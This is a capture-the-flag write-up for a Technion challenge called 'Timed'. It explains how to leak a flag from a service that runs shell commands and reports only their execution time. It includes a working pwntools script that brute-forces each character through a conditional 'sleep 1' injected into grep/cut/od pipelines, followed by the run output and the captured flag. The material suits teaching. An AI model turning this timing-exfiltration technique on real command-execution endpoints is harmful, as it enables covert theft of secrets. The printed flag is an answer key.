# Timed
Category: Miscellaneous

## Description
> Time is of the essence

## Solution


Let's connect to the attached service:

```console
root@kali:/media/sf_CTFs/technion/Timed# nc ctf.cs.technion.ac.il 4015
$ ls -al
Execution Time: 0.006
```

So this challenge has a similar concept to what we saw in [Bashed](Bashed.md), but instead of returning us the SHA256 of the command's output, we get its execution time. 

Just like before, our strategy will be to try and leak the flag character by character. For that, we'll need to somehow distinguish between the different characters based on their value. The `sleep` command seems like a great candidate: It simply postpones execution for the duration given to it:

```console
root@kali:/media/sf_CTFs/technion/Timed# nc ctf.cs.technion.ac.il 4015
$ sleep 3
Execution Time: 3.005
```

We can assume that we'll be able to iterate the flag character after character using the same technique we've used in `Bashed`: `grep -h -r cstechnion |  cut -c  <n>`. So, given a character from the flag, how do we time-encode it? The first solution that comes to mind is to use the character's ASCII value as the duration. But, this means that if the flag contains a `z`, we'll have to wait 122 seconds for just this character! We can try to subtract `chr(' ') = 32` from the ASCII value, given that space is the first printable character that we'd expect to see in the flag, but that still leaves us with almost 90 seconds for the worst cases.

Instead, we'll use a double loop. For each character location we'll iterate all the possible values for printable characters, and sleep for one second if we hit the correct character.

Code:
```python
from pwn import *
import string
import itertools


def get_timing(r, commnad):
    r.sendlineafter("$ ", commnad)
    output = r.recvline()
    return output.decode("ascii").strip()

def connect():
    return remote("ctf.cs.technion.ac.il", 4015)

def get_flag():
    flag = ""

    r = connect()
    with log.progress('Leaking flag... ') as p:
        while True:
            try:
                for i in itertools.count(start = len(flag) + 1):
                    p.status(f"Brute-forcing character #{i}, partial flag: {flag}")
                    for ascii_val in range(ord(' '), ord("~")):
                        out = get_timing(r, f"if [ {ascii_val} -eq $(grep -h -r cstechnion |  cut -c {i} | tr -d '\\n' | od -A n -t d1 | xargs | cut -d ' ' -f1) ]; then sleep 1; fi")
                        out = out.replace("Execution Time: ", "")
                        if out[0] == '1':
                            flag += chr(ascii_val)
                            break
                    else:
                        raise RuntimeError("Can't find flag")
                
                    if flag[-1] == "}":
                        return flag
            except EOFError:
                log.info("Disconnected from server, reconnecting...")
                log.info(f"Flag so far: {flag}")
                r = connect()

flag = get_flag()
log.success(f"Flag: {flag}")

```

Output:
```console
root@kali:/media/sf_CTFs/technion/Timed# python3 solve.py
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[+] Leaking flag... : Done
[*] Disconnected from server, reconnecting...
[*] Flag so far: cstec
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[*] Disconnected from server, reconnecting...
[*] Flag so far: cstechnion
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[*] Disconnected from server, reconnecting...
[*] Flag so far: cstechnion{t1m1n
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[*] Disconnected from server, reconnecting...
[*] Flag so far: cstechnion{t1m1ng_1s_3
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[*] Disconnected from server, reconnecting...
[*] Flag so far: cstechnion{t1m1ng_1s_3very7h
[+] Opening connection to ctf.cs.technion.ac.il on port 4015: Done
[+] Flag: cstechnion{t1m1ng_1s_3very7h1ng}
```

Flag: `cstechnion{t1m1ng_1s_3very7h1ng}`